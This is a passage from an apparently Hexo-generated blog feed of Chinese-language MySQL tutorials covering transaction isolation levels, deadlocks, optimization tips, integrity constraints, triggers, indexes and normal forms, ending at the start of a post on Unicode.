<li>幻读：系统管理员 A 将数据库中所有学生的成绩从具体分数改为 ABCDE 等级，但是系统管理员 B 就在这个时候插入了一条具体分数的记录，当系统管理员 A 改结束后发现还有一条记录没有改过来，就好像发生了幻觉一样，这就叫幻读。</li>
</ol>
<p>小结：不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表</p>
<h2 id="事务的隔离性等级"><a href="#事务的隔离性等级" class="headerlink" title="事务的隔离性等级"></a>事务的隔离性等级</h2><p>事务具有隔离的空间。在 MySQL 服务器中，用户通过不同的会话执行不同的事务，在多用户环境中，许多 RDBMS（关系型数据库管理系统）会话在任意时刻都是活动的。为了使这些事务互不影响，保证数据库性能不受影响，采用事务的孤立等级是很重要的。</p>
<p>如果没有孤立性，不同的查询操作会在同一事务的环境中检索到不同的结果，这将导致数据的不一致性。</p>
<ol>
<li>序列化(serializable)：以序列的形式对事务进行处理。该孤立级的特定是只有当事务提交后，用户才能从数据库上查看数据的变化。</li>
<li>可重读(repeatale read)：事务在孤立级上不会被看成一个序列，不过在当前执行的事务过程中，用户依然看不到事务的过程。直到事务提交为止，用户才能看到事务的变化结果。（客户端 A、B 同时开启事务，B 向表中插入数据行且提交后，A 在自己提交前是看不到改变的）。<strong>是 MySQL 的默认隔离级别</strong>。  </li>
<li>读已提交(read committed)：该孤立级的安全性比可重读低。在这一级事务用户可以看到其他事务添加到新纪录。在事务处理时如果存在其他用户同时对事务的相应表进行修改那么在同一事务的不同时间内，查询操作可能返回不同的结果(客户端 A、B 同时开启事务，B 向表中插入数据行且提交后，A 在自己提交前可以看到改变)</li>
<li>读未提交(read uncommitted)：该孤立级提供事务之间最小程度间隔，该孤立级容易产生幻读。其他用户可以在该孤立级上看到未提交的事务。(客户端 A、B 同时开启事务，B 向表中插入数据行且未提交，A 也可以看到改变)</li>
</ol>
<table>
<thead>
<tr>
<th>孤立等级</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>序列化</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td>可重读</td>
<td>否</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>读已提交</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>读未提交</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
</tbody></table>
<p>不可重复读的重点是修改:同样的条件, 你读取过的数据, 再次读取出来发现值不一样了</p>
<p>幻读的重点在于新增或者删除：同样的条件, 第1次和第2次读出来的记录数不一样</p>
<p>从存储引擎的角度看，解决不可重复读只需锁住对应行，而解决幻读需要保存数据库在事务开始前的快照。</p>
<p>设置事务的隔离等级：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> transaction isolation level &#123;serializable <span class="operator">|</span> repeatable read <span class="operator">|</span> read committed <span class="operator">|</span> read uncommitted&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="事务的性能"><a href="#事务的性能" class="headerlink" title="事务的性能"></a>事务的性能</h2><h3 id="应用小事务"><a href="#应用小事务" class="headerlink" title="应用小事务"></a>应用小事务</h3><p>应用小事务的意义在于保证每个事务不会在执行前等待很长时间，从而避免各个事务因为互相等待而导致系统性能大幅度下降。应尽量缩短 <code>insert</code>、<code>update</code> 等操作与 <code>commit</code> 之间的间隔时间。</p>
<h3 id="合适的孤立级"><a href="#合适的孤立级" class="headerlink" title="合适的孤立级"></a>合适的孤立级</h3><p>事务的性能与其对服务器产生的负载成反比，即事务孤立级越高，其性能越低。例如序列化虽然很稳定，但是会大大影响 MySQL 的性能，生产中比较少用，而用乐观锁悲观锁解决幻读等问题</p>
<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>当两个或多个处于不同序列的用户打算同时更新某相同数据库时，因互相等待对方释放权限而导致双方一直处于等待状态。两个不同序列的客户端同时对数据执行操作极有可能产生死锁。更通俗地讲，当两个事物相互等待操作对方释放所持有的资源而导致两个事务都无法操作对方持有的资源，这样无限期的等待称为死锁。</p>
<p>InnoDB具有检查死锁的功能。如果发现产生了死锁，InnoDB会立刻撤销其中一个任务以便死锁消失。这样就可以使另一个事务获取对方所占有的资源而执行操作逻辑。</p>
<h2 id="优化数据库"><a href="#优化数据库" class="headerlink" title="优化数据库"></a>优化数据库</h2><ul>
<li>使用索引.<strong>对于新表可以先不创建索引，等数据导入后在创建，这样可以提高数据导入效率</strong>。一般来说，索引应建立在那些将用于 JOIN, WHERE 判断和 ORDER BY 排序的字段上。尽量不要对数据库中某个含有大量重复的值的字段建立索引。对于一个ENUM类型的字段来说，出现大量重复值是很有可能的情况</li>
<li>尽量少用 <code>like</code> 语句与通配符 <code>%</code></li>
<li>选取最合适的字段大小。表越小，速度越快。所以能用 <code>char</code> 就不要用 <code>varchar</code> ，能用 <code>mediumint</code> 就不用 <code>bigint</code>。<strong>尽量使用 <code>not null</code> 这样在查询时数据库不用去比较null值。</strong></li>
<li>用 <code>join</code> 代替子查询。这样 MySQL 不需要在内存中创建临时表来完成逻辑上的需要两个步骤的查询工作。。</li>
<li>优化 insert 语句。一次插入多条数据比每次插入一条数据快。能用 <code>union</code> 将多条 <code>select</code> 结合就不要单独用多次 <code>select</code></li>
<li>使用事务。我们可以使用子查询、连接（JOIN）和联合（UNION）来创建各种各样的查询，但不是所有的数据库操作都可以只用一条或少数几条 SQL 语句就可以完成的。更多的时候是需要用到一系列的语句来完成某种工作。在这种情况下，当这个语句块中的某一条语句运行出错的时候，整个语句块的操作就会变得不确定起来。这时候就要用到事务。</li>
<li>用外键分解表中低频字段。有些字段的使用频率很低，当表的数据量很大时查询速度会很慢。用外键将这些字段拆分成一个单独的表可以提高效率。</li>
<li>在相同类型的字段间进行比较的操作</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之完整性约束</title>
    <url>/2018/05/30/mysql%E5%AE%9A%E4%B9%89%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A6%E6%9D%9F/</url>
    <content><![CDATA[<p>MySQL提供了多种完整性约束，作为数据库关系模式定义的一部分，可以通过<code>create table</code>或<code>alter table</code>语句来定义。一旦定义了完整性约束，MySQL服务器会随时检测处于更新状态的数据库内容是否符合相关的完整性约束，从而保证数据的一致性与正确性。</p>
<p>在关系模型中，提供了实体完整性、参照完整性和用户完整性3项规则。</p>
<h1 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h1><p><code>实体</code>是一个数据对象，是指客观存在并可以相互区分的事物，如一个教师、一个学生等。一个实体在数据库中表现为一条记录。</p>
<p>实体完整性是指关系的主属性及主键的组成不能为空。也就是主键不能使空值null。关系对应于现实世界的实体集，而现实世界的实体是可以区分的，即说明每个实例具有唯一性标识。在关系模型中，是使用主键作为唯一性标识的。</p>
<p>先来认识一下关系型数据库中重要的三个键：</p>
<ul>
<li>超键(super key):在关系中能唯一标识元组的属性集称为关系模式的超键 </li>
<li>候选键(candidate key):不含有多余属性的超键称为候选键 </li>
<li>主键(primary key):用户选作元组标识的一个候选键程序主键</li>
</ul>
<p>在MySQL中，实体完整性是通过<em>主键约束</em>和<em>候选键约束</em>实现的。</p>
<h2 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h2><p>主键可以是表中的某一列，也可以是表中多个列所构成的一个组合。其中多个列组合而成的主键也被称为复合主键。在MySQL中，主键必须遵循如下规则：</p>
<ol>
<li>每个表只能定义一个主键</li>
<li>主键必须能唯一标识表中的每一行记录并且不能为null</li>
<li>复合主键不能包含不必要的多余列</li>
<li>一个列名在复合主键的列表中只能出现一次</li>
</ol>
<h3 id="作为列的主键约束"><a href="#作为列的主键约束" class="headerlink" title="作为列的主键约束"></a>作为列的主键约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="作为表的主键约束"><a href="#作为表的主键约束" class="headerlink" title="作为表的主键约束"></a>作为表的主键约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    <span class="keyword">primary</span> key (id,name)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p><strong>如果主键仅由表中的某一列构成，以上两种方法均可以定义主键。如果主键由表中多个列组成，那么只能有第二种方法定义主键约束。</strong></p>
<h2 id="候选键约束"><a href="#候选键约束" class="headerlink" title="候选键约束"></a>候选键约束</h2><p>如果一个属性集能<strong>唯一标识元组</strong>而又<strong>不含有多余的属性</strong>，那么这个属性集称为关系的候选键，用关键字<code>unique</code>来定义。</p>
<p>候选键可以是表中的某一列，也可以是表中多个列所构成的一个组合。<strong>任何时候，候选键的值必须是唯一的且不能为空</strong>。定义方法类似于主键：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>,</span><br><span class="line">    age tinyint</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    <span class="keyword">unique</span> (name,age)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>候选键与主键的区别在于：</p>
<ol>
<li>一个表只能创建一个主键，但是可以有多个候选键</li>
<li>定义主键约束时，系统会自动创建<code>primary key</code>索引，定义候选键约束时，系统会自动创建<code>unique</code>索引</li>
</ol>
<h1 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h1><p>现实世界的实体之间往往存在着某种联系，在关系模型中，实体及实体间的联系都是用关系来描述的，那么自然就存在关系与关系间的引用。</p>
<p><strong>参照完整性就是定义外键与主键之间的引用关系</strong>的。参照完整性的定义为：</p>
<blockquote>
<p>若属性（或属性组）F是基本关系R的外键，它与基本关系S的主键K对应，则对于R中的每个元组在F上的值只允许两种可能：要么取空值，要么等于S中某个元组的主键值，其中R与S可以是不同的关系，也可以是同一是关系，而F和K定义在同一个域中。</p>
</blockquote>
<p>声明外键的基本语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[<span class="keyword">constraint</span> [symbol]] <span class="keyword">foreign</span> key (index_col_name,...) reference_defination</span><br></pre></td></tr></table></figure>
<p><code>reference_defination</code>主要用于定义外键所参照的表、列，它的基本语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">references</span> tbl_name [(index_col_name,...)]</span><br><span class="line">[<span class="keyword">match</span> <span class="keyword">full</span> <span class="operator">|</span> <span class="keyword">match</span> pratial <span class="operator">|</span> <span class="keyword">match</span> simple]</span><br><span class="line">[<span class="keyword">on</span> <span class="keyword">delete</span> reference_options]</span><br><span class="line">[<span class="keyword">on</span> update reference_options]</span><br></pre></td></tr></table></figure>
<p><code>tbl_name</code>指定外键所参照的表名，这个表称为<code>被参照表</code>或<code>父表</code>，外键所在的表被称为<code>参照表</code>或<code>子表</code>。 </p>
<p><code>index_col_name</code>指定被参照表中与外键相关联的列，<strong>必须是父表的主键或候选键</strong>，格式语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">col_name [(length)] [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>]</span><br></pre></td></tr></table></figure>
<p><code>reference_options</code>指定参照完整性约束的实现策略，默认为<code>restrict</code>。语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">restrict <span class="operator">|</span> cascade <span class="operator">|</span> <span class="keyword">set</span> <span class="keyword">null</span> <span class="operator">|</span> <span class="keyword">no</span> action</span><br></pre></td></tr></table></figure>
<p>cascade：瀑布、级联</p>
<ul>
<li>restrict 限制策略：当要删除或更新被参照表中被参照列上，并在外键中出现的值时，系统拒绝对被参照表的删除和更新</li>
<li>no action 不采取措施策略：一个相关的外键值在被参照表中时，删除或更新被参照表中的键值动作不被允许。类似于restrict</li>
<li>cascade 级联策略：从被参照表中删除或更新纪录行时，自动删除或更新参照表匹配的记录行</li>
<li>set null 制空策略：从被参照表中删除或更新纪录行时，设置参照表中与之对应的外键列的值为null。这个策略需要被参照表中的外键没有声明限定词not null</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    class_id tinyint <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> class <span class="keyword">foreign</span> key (class_id) <span class="keyword">references</span> class(id)</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">delete</span> cascade</span><br><span class="line">    <span class="keyword">on</span> update cascade</span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p>**当父子表是同一张表时，MySQL不允许指定<code>on update cascade</code>与<code>on update set null</code>**，相关联的两个字段类型必须一致。</p>
<h1 id="用户定义完整性"><a href="#用户定义完整性" class="headerlink" title="用户定义完整性"></a>用户定义完整性</h1><p>用户定义完整性是针对某一应用环境的完整性约束条件，它反映了某一具体应用所涉及的数据应满足的要求，关系模型提供定义和检查这类完整性规则的机制。</p>
<p>MySQL提供了<strong>非空约束</strong>，<strong>check约束</strong>和<strong>触发器</strong>3种用户自定义完整性约束。</p>
<h2 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h2><p>通过<code>create table</code>或<code>alter table</code>语句将某个列加上关键字<code>not null</code>可以实现非空约束。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify age tinyint <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
<h2 id="check约束"><a href="#check约束" class="headerlink" title="check约束"></a>check约束</h2><p>可以对列或表使用<code>check</code>约束，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">check</span> (expr)</span><br></pre></td></tr></table></figure>
<p><code>expr</code>是一个SQL表达式，用于指定需要检查的限定条件。更新数据时MySQL会检查更新后的数据行是否满足<code>check</code>约束中的限定条件。该条件可以是表达式，也可以是子查询。</p>
<h3 id="对列使用check约束"><a href="#对列使用check约束" class="headerlink" title="对列使用check约束"></a>对列使用check约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint <span class="keyword">check</span>(age<span class="operator">&gt;</span><span class="number">6</span> <span class="keyword">and</span> age<span class="operator">&lt;</span><span class="number">19</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="对表使用check约束"><a href="#对表使用check约束" class="headerlink" title="对表使用check约束"></a>对表使用check约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    <span class="keyword">check</span>(name <span class="keyword">in</span> (<span class="keyword">select</span> name <span class="keyword">from</span> students))</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="触发器约束"><a href="#触发器约束" class="headerlink" title="触发器约束"></a>触发器约束</h2><p>触发器由MySQL的基本命令事件来触发的某种特定操作，这些基本的命令有<code>insert</code>、<code>update</code>、<code>delete</code>等事件来触发某些特定的操作。满足触发器的触发条件时，数据库系统会自动执行触发器中定义的程序语句。</p>
<h3 id="创建单行触发器"><a href="#创建单行触发器" class="headerlink" title="创建单行触发器"></a>创建单行触发器</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> 触发器名 before<span class="operator">|</span>after 触发事件</span><br><span class="line"><span class="keyword">on</span> 表名 <span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span> 执行语句;</span><br></pre></td></tr></table></figure>
<ul>
<li>before|after 指定触发器执行时间是在触发事件之前还是之后</li>
<li>触发事件 <code>insert</code>、<code>delete</code>、<code>update</code>等都是触发事件</li>
<li>执行语句 当满足条件时执行的触发器语句</li>
</ul>
<p>创建一个触发器，自动在用户向users表插入数据行之前向日志插入当前时间：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> userstime before <span class="keyword">insert</span></span><br><span class="line"><span class="keyword">on</span> users <span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userslog <span class="keyword">values</span> (<span class="keyword">null</span>, now());</span><br></pre></td></tr></table></figure>
<h3 id="创建多行触发器"><a href="#创建多行触发器" class="headerlink" title="创建多行触发器"></a>创建多行触发器</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> 触发器名称 before<span class="operator">|</span>after 触发事件</span><br><span class="line"><span class="keyword">on</span> 表名 <span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span> </span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">执行语句列表</span><br><span class="line"><span class="keyword">end</span>\g</span><br></pre></td></tr></table></figure>
<p>要执行的多条语句放入<code>begin</code>和<code>end</code>中，用<code>;</code>分隔。</p>
<h3 id="查看触发器："><a href="#查看触发器：" class="headerlink" title="查看触发器："></a>查看触发器：</h3><p>查看所有触发器：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> triggers;</span><br></pre></td></tr></table></figure>
<p>根据名字查看触发器：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> infomation_schema.triggers <span class="keyword">where</span> trigger_name<span class="operator">=</span>触发器名;</span><br></pre></td></tr></table></figure>

<h3 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">trigger</span> 触发器名称;</span><br></pre></td></tr></table></figure>

<h1 id="命名完整性约束"><a href="#命名完整性约束" class="headerlink" title="命名完整性约束"></a>命名完整性约束</h1><p>可以对完整性使用添加，删除和修改等操作。为了删除和修改完整性约束，需要在定义约束的同时对其进行命名。命名完整性约束是在各种完整性约束的定义说明之前加上<code>constraint</code>字句实现的：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">constraint</span> <span class="operator">&lt;</span>symbol<span class="operator">&gt;</span> [<span class="keyword">primary</span> key <span class="operator">|</span> <span class="keyword">foreign</span> key <span class="operator">|</span> <span class="keyword">check</span>]</span><br></pre></td></tr></table></figure>
<p>对users表添加外键约束并命名为class：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">add</span> <span class="keyword">constraint</span> class <span class="keyword">foreign</span> key (class_id)</span><br><span class="line"><span class="keyword">references</span> class(id)</span><br><span class="line"><span class="keyword">on</span> update cascade</span><br><span class="line"><span class="keyword">on</span> <span class="keyword">delete</span> cascade;</span><br></pre></td></tr></table></figure>
<h1 id="更新完整性约束"><a href="#更新完整性约束" class="headerlink" title="更新完整性约束"></a>更新完整性约束</h1><p>对各种约束命名后就可以用<code>alter table</code>语句来更新或删除。</p>
<h2 id="删除完整性约束"><a href="#删除完整性约束" class="headerlink" title="删除完整性约束"></a>删除完整性约束</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> [<span class="keyword">foreign</span> key <span class="operator">|</span> index <span class="operator">|</span> <span class="operator">&lt;</span>symbol<span class="operator">&gt;</span>] <span class="operator">|</span> <span class="keyword">primary</span> key;</span><br></pre></td></tr></table></figure>
<p>在删除主键时，必须在创建一个主键否则不会成功。</p>
<p>删除users表的名为class的外键：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">drop</span> <span class="keyword">foreign</span> key class;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之索引与范式</title>
    <url>/2018/05/30/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E7%B4%A2%E5%BC%95%E4%B8%8E%E8%A7%86%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>索引是一种特殊的数据结构，类似于字典里的 key。通过索引查询数据库中的内容时，不需要遍历所有数据而是直接指向数据所在的位置，这样就可以快速查询到想要的内容。</p>
<p>索引是把双刃剑，虽然索引可以提高检索数据的速度，提高整体的性能，但是也会带来一些副作用：  </p>
<ol>
<li>额外的物理空间（单列索引至少占原表5%到15%）</li>
<li>额外的创建和维护时间（create、insert、update、delete等）</li>
</ol>
<p>MySQL 支持很多数据类型，选择合适的数据类型存储数据对性能有很大的影响。通常来说，可以遵循以下一些指导原则：</p>
<ol>
<li>越小的数据类型通常更好：越小的数据类型通常在磁盘、内存和CPU缓存中都需要更少的空间，处理起来更快。</li>
<li>简单的数据类型更好：整型数据比起字符，处理开销更小，因为字符串的比较更复杂。在MySQL中，应该用内置的日期和时间数据类型，而不是用字符串来存储时间；以及用整型数据类型存储IP地址。</li>
<li>尽量避免NULL：应该指定列为NOT NULL，除非你想存储NULL。在MySQL中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值。</li>
</ol>
<h2 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h2><p>常见的索引包括普通索引、唯一性索引、全文索引、单列索引、多列索引等</p>
<ol>
<li>普通索引：即不应用任何限制条件的索引，该索引可以在任何数据类型中创建。字段本身的约束条件可以判断其值是否为空或唯一。</li>
<li>唯一性索引：使用 <code>unique</code> 参数可以设置唯一索引。创建该索引时索引的值必须唯一。通过唯一索引，用户可以快速定位某条数据。<strong>主键是一种特殊的唯一索引</strong>。</li>
<li>全文索引：<code>fulltext</code> 参数可以设置索引为全文索引。全文索引只能创建在 <code>char</code>、<code>varchar</code>、<code>text</code> 类型字段上。查询数据量较大的字符串型字段时，使用全文索引可以提高查询速度。<strong>只有 MyISAM 支持 <code>fulltext</code> 索引</strong></li>
<li>单列索引：就是只对应一个字段的索引，可以包括以上三种索引方式。</li>
<li>多列索引：在表的多个字段上创建一个索引。该索引指向创建时对应的多个字段。可用通过这几个字段进行查询但是<strong>这几个字段必须包含多列索引的第一个字段，只有这样多列索引才会发挥作用</strong></li>
</ol>
<h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><h3 id="在建立数据表时创建索引"><a href="#在建立数据表时创建索引" class="headerlink" title="在建立数据表时创建索引"></a>在建立数据表时创建索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name (</span><br><span class="line">    create_defination</span><br><span class="line">    [<span class="keyword">unique</span> <span class="operator">|</span> fulltext] index</span><br><span class="line">    [别名](属性名<span class="number">1</span>[(长度)[,属性名<span class="number">2</span>(长度)...]] [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>])</span><br><span class="line">)[table_options];</span><br></pre></td></tr></table></figure>

<p>一个简单的例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    sex tinyint(<span class="number">1</span>),</span><br><span class="line">    fulltext index username(name)</span><br><span class="line">)engine<span class="operator">=</span>MyISAM;</span><br></pre></td></tr></table></figure>

<h3 id="在已建立的数据表中创建索引"><a href="#在已建立的数据表中创建索引" class="headerlink" title="在已建立的数据表中创建索引"></a>在已建立的数据表中创建索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">unique</span> <span class="operator">|</span> fulltext] index index_name </span><br><span class="line"><span class="keyword">on</span> table_name(属性[(长度) [AES<span class="operator">|</span><span class="keyword">DESC</span>]])</span><br></pre></td></tr></table></figure>

<p>一个简单的例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index username <span class="keyword">on</span> users(name);</span><br></pre></td></tr></table></figure>

<p>也可以通过修改表结构的方式创建索引，参见《MySQL从入门到精通》之基本语句。</p>
<h1 id="范式-Normal-Form"><a href="#范式-Normal-Form" class="headerlink" title="范式(Normal Form)"></a>范式(Normal Form)</h1><p>关系型数据库的规范化理论为：关系数据库中的每一个关系都要满足一定的规范。根据满足规范的条件不同，可以分为5个等级，一般只要把数据库规范到第三等级就足够了。</p>
<h2 id="第一范式-1NF"><a href="#第一范式-1NF" class="headerlink" title="第一范式(1NF)"></a>第一范式(1NF)</h2><p>第一范式包括下列指导原则：</p>
<ol>
<li>数据组中的每个属性只可以包含一个值</li>
<li>关系中的每个数组必须包含相同数量的值</li>
<li>关系中的每个数组一定不能相同</li>
</ol>
<p>在任何一个关系型数据库中，第一范式是对关系模式的基本要求，不满足第一范式的数据库就不是关系型数据库。  </p>
<p><strong>如果数据表中的每一个列都是不可再分割的基本数据项，即同一列中不能有多个值，那么就称此数据表符合第一范式</strong>，由此可见第一范式具有不可再分割的原子特性。</p>
<h2 id="第二范式-2NF"><a href="#第二范式-2NF" class="headerlink" title="第二范式(2NF)"></a>第二范式(2NF)</h2><p>第二范式是在第一范式的基础上建立起来的，即满足第二范式必须先满足第一范式。<strong>第二范式要求数据库表中的每个实体（即各个记录行）必须可以被唯一地区分</strong>。 为了实现区分各记录行通常需要为表设置一个“区分列”，用以存储各个实体的唯一标识。这个唯一属性列被称为<strong>主关键字或主键。</strong></p>
<h2 id="第三范式-3NF"><a href="#第三范式-3NF" class="headerlink" title="第三范式(3NF)"></a>第三范式(3NF)</h2><p>第三范式是在第二范式的基础上建立起来的。<strong>第三范式要求关系表不存在非关键字列对任意候选关键字列的传递函数依赖</strong>，也就是说，第三范式要求一个关系表中不包含已在其他表中包含的非主关键字信息。<br>所谓传递函数依赖，就是指如果存在关键字段A决定非关键字段B，而非关键字段B决定非关键字段C，则称非关键字段C传递函数依赖与关键字段A。参考下面的例子：  </p>
<blockquote>
<p>(员工编码) ——&gt; (决定) (员工姓名、年龄、部门编码、部门经理)  </p>
</blockquote>
<p>上面这个关系表是符合第二范式的，但是不符合第三范式，因为该关系表内部隐含着如下关系：</p>
<blockquote>
<p>(员工编码) ——&gt; (决定) (部门编码) ——&gt; (决定) (部门经理)  </p>
</blockquote>
<p>上面的关系表纯真非关键字段“部门经理”对关键字段“员工编码”的函数传递依赖，对于上面这种关系，可以把这个关系表改为如下两个关系表：  </p>
<blockquote>
<p>员工信息表：(员工编码，员工姓名，年龄好部门编码)<br>部门信息表：(部门编码和部门经理)  </p>
</blockquote>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>也谈 Unicode</title>
    <url>/2018/05/23/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h2 id="不同的编码方式"><a href="#不同的编码方式" class="headerlink" title="不同的编码方式"></a>不同的编码方式</h2><p>由于计算机是美国人发明的，所以最早的时候只收录了 127 个字符，包括阿拉伯数字、英文字母大小写和一些常用符号，称为 <code>ASCII</code>。后来计算机越来越普及，127 个字符显然不够。于是各国又制定了自己国家的字符编码。为了避免不同国家之间通信出现乱码的问题，一种统一字符集 <code>Unicode</code> 诞生了。<code>ASCII</code> 用 1 个字节来储存一个字符，而 <code>Unicode</code> 用 4 个字节来储存字符。理论上所有的文字、符号都可以用 Unicode 编码表示。换言之，Unicode 是一种表示所有字符的方式`。</p>
